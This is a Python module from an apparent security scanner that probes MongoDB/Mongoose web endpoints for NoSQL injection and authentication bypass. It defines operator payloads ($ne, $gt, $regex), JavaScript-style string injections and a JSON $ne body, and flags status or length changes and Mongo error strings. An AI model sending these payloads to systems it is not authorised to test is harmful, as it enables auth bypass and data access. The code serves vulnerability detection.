"""NoSQL Agent — NoSQL injection probing for MongoDB/Mongoose backends"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import AUTH, INJECTION


class NoSQLAgent:
    """Detects NoSQL injection and auth bypass via operator/string payloads"""

    # (param suffix, value, kind) — injects a Mongo operator as a nested key
    OP_PAYLOADS = [
        ("[$ne]", "", "operator_ne"),
        ("[$gt]", "", "operator_gt"),
        ("[$regex]", ".*", "operator_regex"),
    ]

    STRING_PAYLOADS = [
        ("' || '1'=='1", "boolean_or"),
        ("'; return true; var x='", "js_return_true"),
    ]

    JSON_PAYLOAD = {"$ne": None}

    MONGO_ERRORS = [
        r"MongoError", r"BSONError", r"CastError", r"E11000", r"mongoose",
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "NoSQL"

    def scan(self, url: str, tech_context: str = "", **kwargs) -> dict:
        findings = []
        params = []
        for p in AUTH + INJECTION:
            if p not in params:
                params.append(p)

        try:
            for param in params[:12]:
                # Baseline with a benign value
                baseline = self.http.send_payload(url, param, "briartest")
                if "error" in baseline:
                    continue
                base_status = baseline["status"]
                base_len = baseline["length"]

                # Operator-based payloads (Mongo operator injected as nested key)
                for suffix, value, kind in self.OP_PAYLOADS:
                    inj_param = param + suffix
                    result = self.http.send_payload(url, inj_param, value)
                    if "error" in result:
                        continue
                    self._evaluate(findings, param, inj_param + "=" + value, kind,
                                   result, base_status, base_len, op_bypass=True)

                # String-based payloads
                for payload, kind in self.STRING_PAYLOADS:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue
                    self._evaluate(findings, param, payload, kind,
                                   result, base_status, base_len, op_bypass=False)

                # JSON body payload {"$ne": null} via POST json=
                try:
                    resp = self.http.post(url, json={param: self.JSON_PAYLOAD})
                    text = resp.text[:500]
                    err = self.http.detect_error(text, self.MONGO_ERRORS)
                    if err:
                        findings.append({
                            "type": "NoSQL Injection (Mongo error)",
                            "severity": "High",
                            "param": param,
                            "payload": '{"$ne": null}',
                            "method": "POST json",
                            "marker": err,
                            "status": resp.status_code,
                        })
                    elif resp.status_code in (200, 302) and base_status not in (200, 302):
                        findings.append({
                            "type": "NoSQL auth bypass (JSON $ne)",
                            "severity": "Critical",
                            "param": param,
                            "payload": '{"$ne": null}',
                            "method": "POST json",
                            "status": resp.status_code,
                            "baseline_status": base_status,
                        })
                except Exception:
                    pass
        except Exception:
            pass

        analysis = f"NoSQL scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} issues found:**\n\n"
            for f in findings:
                analysis += f"- {f.get('type', '?')} ({f.get('severity', '?')})\n"
        else:
            analysis += "No issues detected.\n"
        analysis += "\n---\n\nLLM analysis:\n"

        result = self.analyzer.analyze_endpoint(url, "GET", tech_context=tech_context, source_hint=analysis)
        result["real_findings"] = findings
        result["agent"] = self.name
        result["type"] = "NoSQL Injection"
        result["severity"] = self._severity(findings)
        return result

    def _evaluate(self, findings, param, payload, kind, result, base_status, base_len, op_bypass):
        text = result.get("text_snippet", "")
        status = result.get("status")
        length = result.get("length", 0)

        err = self.http.detect_error(text, self.MONGO_ERRORS)
        if err:
            findings.append({
                "type": f"NoSQL Injection ({kind})",
                "severity": "High",
                "param": param,
                "payload": payload,
                "marker": err,
                "status": status,
            })
            return

        # Auth bypass: operator payload flips response to authenticated-like state
        if op_bypass and status in (200, 302) and base_status not in (200, 302):
            findings.append({
                "type": f"NoSQL auth bypass ({kind})",
                "severity": "Critical",
                "param": param,
                "payload": payload,
                "status": status,
                "baseline_status": base_status,
            })
            return

        # Behavioural change vs baseline (status or significant length delta)
        if status != base_status or (base_len and abs(length - base_len) > 100):
            findings.append({
                "type": f"NoSQL behaviour change ({kind})",
                "severity": "Medium",
                "param": param,
                "payload": payload,
                "status": status,
                "baseline_status": base_status,
                "length": length,
                "baseline_length": base_len,
            })

    @staticmethod
    def _severity(findings):
        order = ["Critical", "High", "Medium", "Low", "Info"]
        for s in order:
            if any(f.get("severity") == s for f in findings):
                return s
        return "Info"
